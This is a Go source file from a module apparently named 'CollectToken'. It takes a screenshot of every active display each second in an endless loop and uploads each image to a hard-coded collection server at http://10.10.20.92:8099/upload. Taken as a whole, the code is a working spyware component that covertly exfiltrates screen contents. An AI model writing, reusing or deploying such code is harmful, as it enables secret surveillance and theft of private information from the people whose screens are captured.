package Screenshot

import (
	"CollectToken/report"
	"github.com/kbinani/screenshot"
	"image/png"
	"os"
	"fmt"
	"time"
)

func ScreenshotRun() {
	for  {
		handle(NowTime())
		time.Sleep(1*time.Second)
	}
}

func handle(ttime string){
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		fileName := fmt.Sprintf("%s_%d_%dx%d.png",ttime, i, bounds.Dx(), bounds.Dy())
		file, err := os.Create(fileName)
		if err != nil {
			fmt.Println(err)
			return
		}
		defer file.Close()
		png.Encode(file, img)

		fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
		_,err = report.PostFile(fileName,"http://10.10.20.92:8099/upload")
		if err != nil {
			fmt.Println(err)
			os.Exit(0)
		}
	}

}

func NowTime() string {
	return time.Now().Format("2006_01_02_15_04_05")
}
